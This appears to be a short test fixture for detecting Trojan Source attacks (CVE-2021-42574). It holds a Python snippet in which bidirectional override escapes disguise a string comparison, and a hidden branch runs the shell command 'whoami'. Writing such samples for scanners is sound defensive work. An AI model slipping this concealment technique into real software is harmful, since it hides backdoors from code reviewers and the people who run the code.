"""Malicious: Bidi override characters (CVE-2021-42574) concealing backdoors."""
# Trojan Source attack using right-to-left override
access_level = "user"
if access_level != "none\u202e \u2066# Check admin\u2069 \u202e":
    import os
    os.system("whoami")
